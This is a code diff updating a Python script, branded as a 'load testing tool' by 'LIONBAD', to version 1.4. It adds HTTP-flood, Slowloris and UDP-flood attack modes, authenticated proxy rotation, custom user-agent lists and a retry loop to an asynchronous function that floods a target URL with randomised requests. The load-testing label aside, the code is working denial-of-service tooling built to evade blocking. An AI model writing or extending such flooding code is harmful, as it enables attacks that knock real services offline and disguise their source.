@@ -77,7 +77,7 @@ def display_banner():
 ║                                                          ║
 ║               Advanced Load Testing Tool                 ║
 ║                                                          ║
-║                      Version 1.3                         ║
+║                      Version 1.4                         ║
 ║                                                          ║
 ║                  Coded By: LIONBAD                       ║
 ║                                                          ║
@@ -102,6 +102,10 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
+    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
+    parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
+    parser.add_argument("--user-agents", help="File containing custom user-agent strings")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -176,7 +180,7 @@ def is_valid_ip(ip: str):
     except socket.error:
         return False
 
-async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json"):
+async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform a rate-limited attack."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
@@ -188,30 +192,31 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
-                try:
-                    headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
-                    method = random.choice(HTTP_METHODS)
-                    payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
+                for attempt in range(retry):
+                    try:
+                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
+                        method = random.choice(HTTP_METHODS)
+                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
-                    proxy = next(proxy_pool) if proxy_pool else None
-                    async with session.request(
-                        method, target_url, headers=headers, proxy=proxy, data=payload
-                    ) as response:
+                        proxy = next(proxy_pool) if proxy_pool else None
+                        async with session.request(
+                            method, target_url, headers=headers, proxy=proxy, data=payload
+                        ) as response:
+                            with requests_lock:
+                                requests_sent += 1
+                                if response.status in [200, 201, 204]:
+                                    successful_requests += 1
+                                else:
+                                    failed_requests += 1
+                        break  # Exit retry loop if request succeeds
+                    except aiohttp.ClientError as e:
                         with requests_lock:
-                            requests_sent += 1
-                            if response.status in [200, 201, 204]:
-                                successful_requests += 1
-                            else:
-                                failed_requests += 1
-                except aiohttp.ClientError as e:
-                    with requests_lock:
-                        failed_requests += 1
-                    logging.error(f"Client error during request: {e}")
-                except Exception as e:
-                    with requests_lock:
-                        failed_requests += 1
-                    logging.error(f"Unexpected error during request: {e}")
-
+                            failed_requests += 1
+                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
+                    except Exception as e:
+                        with requests_lock:
+                            failed_requests += 1
+                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
@@ -285,7 +290,7 @@ async def main():
     tasks = []
 
     for _ in range(args.threads):
-        task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload))
+        task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
         tasks.append(task)
 
     display_thread = threading.Thread(
